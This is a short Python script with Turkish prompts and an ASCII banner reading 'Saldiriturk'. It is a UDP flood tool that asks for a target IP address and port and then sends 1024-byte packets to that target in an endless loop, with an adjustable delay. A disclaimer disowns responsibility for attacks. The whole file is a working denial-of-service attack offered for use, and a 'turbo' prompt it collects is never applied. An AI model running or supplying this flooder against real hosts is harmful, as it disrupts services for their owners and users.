import socket
import time
import argparse

parser = argparse.ArgumentParser(description="saldiriturk")
parser.add_argument('-t', '--turbo', type=float, default=1.0, help="Ping gönderme hızı (saniye cinsinden bekleme süresi)")

args = parser.parse_args()

print("""
  ___       _    _ _     _ _____         _   
 / __| __ _| |__| (_)_ _(_)_   _|  _ _ _| |__
 \__ \/ _` | / _` | | '_| | | || || | '_| / /
 |___/\__,_|_\__,_|_|_| |_| |_| \_,_|_| |_\_\
                                             
""")

print("""
Lütfen sorumlulukla kullanınız. Bu program kullanılarak yapılan hiç bir saldırıdan ben (yapımcı) sorumlu değilim.
""")

target_ip = input('Hedefin IP adresini giriniz: ')
target_port = int(input('Hedef portu giriniz: '))
parser_turbo = input('Turbo seviyesini ayarlayınız:')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    data = ' ' * 1024
    sock.sendto(data.encode(), (target_ip, target_port))
    print(f"Ping gönderildi: {target_ip}:{target_port}")
    
    time.sleep(args.turbo)
